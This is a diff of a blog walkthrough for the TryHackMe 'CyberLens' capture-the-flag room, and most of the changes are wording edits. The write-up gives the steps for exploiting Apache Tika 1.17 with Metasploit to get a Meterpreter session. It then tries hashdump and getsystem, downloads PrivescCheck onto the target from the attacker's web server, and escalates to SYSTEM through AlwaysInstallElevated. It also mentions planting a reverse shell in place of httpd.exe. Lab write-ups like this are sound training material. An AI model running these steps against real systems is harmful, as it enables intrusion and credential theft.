@@ -53,7 +53,7 @@ Tyler, is the description AI generated? It's okay if it is, no shame, just curio
 
 [UPDATE] Yes, it's AI. Tyler mentions it in his [Official Walkthrough](https://youtu.be/eFWEwS5thu4?si=ptGJISHJlWbWGAWD).
 
-There's a **Things to Note** which is nice. 
+There's **Things to Note** which is nice. 
 
 Add the `MACHINE_IP` to `/etc/hosts/` and wait 5 minutes. Done.
 
@@ -61,7 +61,7 @@ But the focus are two flags. 1) User, and 2) Administrator.
 
 A familiar room challenge. 
 
-Perfect to get back into the swing of things. 
+Perfect for me to get back into things. 
 
 Let's go.
 
@@ -77,25 +77,27 @@ It's easier to start on port 80 via cyberlens[.]thm.
 
 With a quick look at WhatRuns and Wappalyzer, seems like an Apache Server running a basic html/css template on Bootstrap.
 
+Also it's on a Windows Server, good to know for later.
+
 ![Wappalyzer](https://i.imgur.com/1iT4X3m.png)
 
 Nothing too interesting until scrolling down and seeing a form.
 
 ![CyberLens Website Form](https://i.imgur.com/9ZHgSAR.png)
 
-And with a quick view-source, we've got an interesting end-point to look at.
+And with a quick view-source, we've got an interesting end-point.
 
 ![Web Form Showing Port 61777](https://i.imgur.com/0DFddsE.png)
 
-Since the web form is fetching via 'http', perhaps we can see something via the browser?
+Since the web form is fetching via 'http', perhaps we can see via the browser?
 
 ![Apache Tika](https://i.imgur.com/hqOId3k.png)
 
-Ah, some sort of Apache service, with a version number. Interesting.
+Ah, an Apache service with a version number. Interesting.
 
 So, from searching **Apache Tika** it's a **toolkit (that) detects and extracts metadata** from file types like PDFs etc.
 
-I guess this feeds into the CyberLens description from earlier.
+This feeds into the CyberLens description from earlier.
 
 And from searching **Apache Tika 1.17 Exploit** we've got our *in*.
 
@@ -116,38 +118,40 @@ Use `msfconsole -q` and then `search tika` to find our exploit.
 It's `exploit/windows/http/apache_tika_jp2_jscript` or type `use 0` when it's the first search item.
 
 Set the following options with `set $option $value`:
-- RHOSTS = $MACHINE_IP
-- RPORT = 61777
-- LHOST = $YOUR_IP
+- `set RHOSTS $MACHINE_IP`
+- `set RPORT 61777`
+- `set LHOST $YOUR_IP`
 
-For example, `set LHOST 10.10.10.10` and then use `run` or `go` when you're ready.
+And then use `run` or `go` when you're ready.
 
-The user flag hint "Sometimes exploits take a few tries before they are successful ;)" comes in here.
+The user flag hint **Sometimes exploits take a few tries before they are successful ;)** comes in here.
 
-You may need to try this once or twice to get it working. Just check your exploit options are correct.
+You may need to try this once or twice to get it working. Double check your options are correct.
 
-But when the exploit works and a session is created, you'll be greeted with:
+When the exploit works and a sessions created, you'll see:
 
 ![Metasploit Tika Exploit Session](https://i.imgur.com/fybpy7B.png)
 
-We're in. Now what? Well first, who are we?
+We're in.
 
-With a quick `whoami` we're the user `cyberlens`. Cool.
+So who are we?
 
-Then since we're in Meterpreter, there's extra luxuries to try, like:
+A quick `whoami` and we're user `cyberlens`.
+
+Since we're in Meterpreter, there are extra luxuries, like:
 - `sysinfo` for some system background.
 - `getsystem` for a quick priv esc attempt... no luck there.
 - `hashdump` for a sneaky SAM database dump... again, no luck.
 
-Worth a quick try.
+Worth a try.
 
 Otherwise, let's look around. Do what the kids call 'manual enumeration'.
 
-We can also drop a normal shell on the system using `shell` and then enter PowerShell with `powershell`.
+We can drop a shell on the system using `shell` and then enter PowerShell with `powershell`.
 
 ![Meterpreter Shell To PowerShell](https://i.imgur.com/vGEq0YN.png)
 
-Here we can try some to see maybe some info about what we can do:
+Let's see some info about what we can do:
 - `whoami /priv`
 - `whoami /all`
 
@@ -155,16 +159,16 @@ Here we can try some to see maybe some info about what we can do:
 
 If you're like me, there's a few rabbit holes to explore.
 
-What's `SeChangeNotifyPrivilege`? Does it give me anything? Nope.
+What's `SeChangeNotifyPrivilege`? Does it give me anything? After a quick Google, nope.
 
-Let's just look around then.
+Let's look around then.
 
 Some good places to check are:
 - `C:\`
 - `C:\Users`
 - `C:\Windows\Temp`
 
-Since we're in PowerShell, use `gci` to list out contents. 
+Since we're in PowerShell, use `ls` or `gci` to list out contents. 
 
 (Oh PowerShell, your commands are so simple to remember.)
 
@@ -172,7 +176,7 @@ For example, `cd C:\Users\CyberLens` and `gci -recurse .`
 
 ![Recursive User Files](https://i.imgur.com/8WqfJFa.png)
 
-Ah, interesting. 1) `user.txt`, and 2) `CyberLens-Management.txt`
+Interesting, the `user.txt`, and a `CyberLens-Management.txt`
 
 ![Displaying User Flag and CyberLens Credentials](https://i.imgur.com/cKWW22f.png)
 
@@ -182,37 +186,43 @@ Alright, now we have some credentials: `CyberLens:H************3`
 
 I'll be honest. I got stuck here, like really stuck.
 
-For me, the *hint* didn't help "RDP will make your life easier. If Remmina is not working, try this: rdesktop -u [user] -p [password] -N cyberlens.thm:3389"
+The *hint* didn't help **RDP will make your life easier. If Remmina is not working, try this: rdesktop -u [user] -p [password] -N cyberlens.thm:3389**.
 
-Sticking with a PowerShell terminal was the way to go for me.
+For me, sticking with PowerShell was the way to go.
 
-Let's try some automated enumeration now.
+But after a few rabbit holes, I took a step back and watched [Windows Privilege Escalation Guide](https://youtu.be/w3v_ydcw3T4?si=llF_n2L0og3RkSon).
 
-After a few rabbit holes, took a step back and watched [Windows Privilege Escalation Guide](https://youtu.be/w3v_ydcw3T4?si=llF_n2L0og3RkSon).
-
-So tried a new (for me) script called [PrivesCheck](https://github.com/itm4n/PrivescCheck).
+Which led to a new (for me) script called [PrivesCheck](https://github.com/itm4n/PrivescCheck).
 
 ![Download PrivescCheck Script](https://i.imgur.com/kWKbJc2.png)
+
+If you're following along at home.
 
 Start a Python Web Server with `python -m http.server 8000` where you download the script. 
 
 ![Transfer PrivescCheck Script](https://i.imgur.com/6LhBV1v.png)
 
-On the Target Machine, put the script where you have write permissions. Like the Desktop.
+Then on the Target Machine, put the script where you have write permissions. Like the Desktop or Temp.
 
-Then you can use `wget http://$YOUR_IP:8000/$file -UseBasicParsing -OutFile $file`
+You can use `wget http://$YOUR_IP:8000/$file -UseBasicParsing -OutFile $file` in PowerShell.
 
 Go ahead and run the script `. .\PrivescCheck.ps1; Invoke-PrivescCheck`
 
-Gotta say, I do like the output of PrivescCheck. Easy to digest with the summary at the end.
+Gotta say, I do like the output of PrivescCheck. An easy-to-digest summary is nice.
 
 ![PrivescCheck Summary](https://i.imgur.com/k4wFGdl.png)
 
-So what's `AlwaysInstallElevated`???
+So what's `AlwaysInstallElevated`?
 
-Luckily, [HackTricks](https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation) has info about it.
+Basically, it allows lower level users to install Windows Packages with system level privileges.
 
-And there's another metasploit exploit ready to rock for us. Lovely.
+You see where this is going?
+
+And luckily, [HackTricks](https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation) has more info about it.
+
+Would you look at that?
+
+There's another metasploit exploit ready to rock for us. Lovely.
 
 Exit PowerShell and go back to Meterpreter with `exit` and `exit`.
 
@@ -238,9 +248,9 @@ Then `cat C:\Users\Administrator\Desktop\admin.txt` for the admin flag.
 
 ## Reflection & Rabbit Holes
 
-CyberLens has been a great room, props to Tyler and TryHackMe.
+CyberLens has been great, props to Tyler and TryHackMe.
 
-It's Easy rated, but the priv esc portion really stumped me.
+It's Easy rated, but the priv esc portion stumped me.
 
 I went down a few Rabbit Holes:
 - RDP led me replacing `C:\Apache24\bin\httpd.exe` with a reverse shell. Then using a startup.bat which using a Visual Basics script to run `httpd.exe`.
@@ -251,7 +261,7 @@ Since I have more Linux priv esc experience, this was a good room for me. I need
 
 Some key takeaways:
 - Metasploit makes things easier. It'd be good to do this room again without using it though. Push myself a bit.
-- Research is king. I spent more time reading up about services and vulnerabilities. Even though I went down rabbit holes, I learner more.
+- Research is king. I spent more time reading up about services and vulnerabilities. Even though I went down rabbit holes, I learned more.
 - Stay calm and take breaks. I've rushed rooms to push content out in the past. Instead I took my time and just focused on learning.
 
 Thanks again to Tyler and TryHackMe. 
